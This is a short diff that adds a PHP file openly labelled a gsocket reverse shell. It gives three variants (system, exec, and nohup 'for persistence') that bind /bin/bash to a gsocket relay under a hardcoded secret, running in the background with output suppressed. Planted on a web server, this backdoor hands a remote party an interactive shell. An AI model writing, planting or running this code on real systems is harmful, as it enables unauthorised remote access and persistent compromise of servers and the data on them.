@@ -1,0 +1,13 @@
+<?php
+// PHP gsocket reverse shell
+$secret = "Nyxentra";
+
+// Method 1: Using system
+system("gsocket -s {$secret} /bin/bash 2>/dev/null &");
+
+// Method 2: Using exec in background
+exec("gsocket -s {$secret} /bin/bash > /dev/null 2>&1 &");
+
+// Method 3: Using nohup for persistence
+exec("nohup gsocket -s {$secret} /bin/bash > /dev/null 2>&1 &");
+?>
